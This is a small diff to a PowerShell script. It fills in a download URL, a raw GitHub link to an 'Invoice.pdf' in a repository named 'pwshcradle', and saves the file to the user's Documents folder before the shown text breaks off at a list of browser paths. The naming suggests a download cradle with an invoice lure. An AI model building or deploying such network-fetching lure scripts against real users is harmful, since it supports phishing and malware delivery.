@@ -1,4 +1,4 @@
-$pdfUrl  = "URL_TO_PDF"
+$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
 $pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"
 
 $browserPaths = @(
